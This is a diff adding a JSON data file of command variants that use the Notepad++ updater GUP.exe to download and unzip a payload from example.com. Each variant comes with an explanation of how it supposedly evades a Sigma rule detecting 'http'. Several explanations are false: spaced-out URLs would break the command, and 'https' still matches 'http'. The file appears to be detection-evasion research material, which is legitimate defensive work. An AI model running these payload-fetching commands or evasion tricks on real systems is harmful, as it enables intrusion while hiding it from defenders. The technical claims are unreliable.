@@ -1,0 +1,22 @@
+[
+  {
+    "output": "GUP.exe -unzipTo C:\\Temp h t t p : / / example.com/payload.zip",
+    "explanation": "The command uses reordering and recoding (inserting spaces between characters in the URL) to bypass the Sigma rule's detection of 'http' in the command line. The program behavior remains unchanged."
+  },
+  {
+    "output": "GUP.exe -unzipTo=C:\\Temp https://example.com/payload.zip",
+    "explanation": "The command uses substitution (using 'https' instead of 'http') and omission (removing quotes) to avoid the rule's detection of 'http' in the command line. The behavior is preserved."
+  },
+  {
+    "output": "GUP.exe -unzipTo=C:\\Temp \"h t t p : / / example.com/payload.zip\"",
+    "explanation": "The command uses insertion (adding spaces between URL characters) and quotes to obfuscate the 'http' pattern while maintaining the same functionality."
+  },
+  {
+    "output": "GUP.exe -unzipTo=C:\\Temp $env:url",
+    "explanation": "The command uses environment variable recoding to store the URL in a variable, bypassing the Sigma rule's direct detection of 'http' in the command line."
+  },
+  {
+    "output": "GUP.exe -unzipTo=C:\\Temp http://example.com/payload.zip",
+    "explanation": "This is the original command and not a bypass. It is included for comparison."
+  }
+]
